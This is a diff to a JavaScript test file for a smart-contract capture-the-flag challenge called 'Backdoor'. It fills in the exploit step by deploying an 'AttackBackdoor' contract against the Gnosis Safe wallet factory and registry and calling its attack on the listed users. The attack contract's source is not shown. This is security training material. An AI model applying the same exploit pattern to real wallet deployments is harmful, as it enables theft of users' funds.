@@ -15,7 +15,7 @@ describe('[Challenge] Backdoor', function () {
         this.masterCopy = await (await ethers.getContractFactory('GnosisSafe', deployer)).deploy();
         this.walletFactory = await (await ethers.getContractFactory('GnosisSafeProxyFactory', deployer)).deploy();
         this.token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
-        
+
         // Deploy the registry
         this.walletRegistry = await (await ethers.getContractFactory('WalletRegistry', deployer)).deploy(
             this.masterCopy.address,
@@ -28,7 +28,7 @@ describe('[Challenge] Backdoor', function () {
         for (let i = 0; i < users.length; i++) {
             expect(
                 await this.walletRegistry.beneficiaries(users[i])
-            ).to.be.true;            
+            ).to.be.true;
         }
 
         // Transfer tokens to be distributed to the registry
@@ -37,13 +37,31 @@ describe('[Challenge] Backdoor', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+
+        const attackMasterCopy = this.masterCopy.connect(attacker);
+        const attackWalletFactory = this.walletFactory.connect(attacker);
+        const attackToken = this.token.connect(attacker);
+        const attackWalletRegistry = this.walletRegistry.connect(attacker);
+
+        // Deploy our attack contract
+        const AttackBackdoor = await ethers.getContractFactory("AttackBackdoor", attacker);
+        const attackContract = await AttackBackdoor.deploy(
+            attackMasterCopy.address,
+            attackWalletFactory.address,
+            attackToken.address,
+            attackWalletRegistry.address,
+        );
+
+        // Attack
+        await attackContract.attack(users);
+
     });
 
     after(async function () {
         /** SUCCESS CONDITIONS */
         for (let i = 0; i < users.length; i++) {
             let wallet = await this.walletRegistry.wallets(users[i]);
-            
+
             // User must have registered a wallet
             expect(wallet).to.not.eq(ethers.constants.AddressZero, "User did not register a wallet");
 
